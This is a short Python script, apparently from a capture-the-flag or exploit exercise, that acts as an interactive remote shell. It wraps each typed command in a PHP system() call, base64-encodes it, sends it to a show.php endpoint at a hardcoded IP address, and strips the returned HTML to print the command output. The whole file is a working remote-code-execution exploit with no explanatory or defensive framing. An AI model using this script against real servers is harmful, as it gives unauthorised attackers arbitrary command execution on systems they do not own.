# -*- coding: utf-8 -*-
import requests
import base64
import re

while True:
    cmd = input("(>3<)$ ").encode("utf-8")
    data = base64.b64encode(b"system('"+cmd+b"')").decode("utf-8")
    res = requests.get("http://34.82.49.144:3337/show.php?data="+data)
    res = re.sub("<html>\n<head>\n<meta charset=\"utf-8\">\n<title>result</title>\n</head>\n<body>\n<h1>結果</h1>\n<p>.*</p>\n</body>\n</html>", "", res.text)
    res = (res+"\n").replace("\n\n", "\n")
    print(res, end="")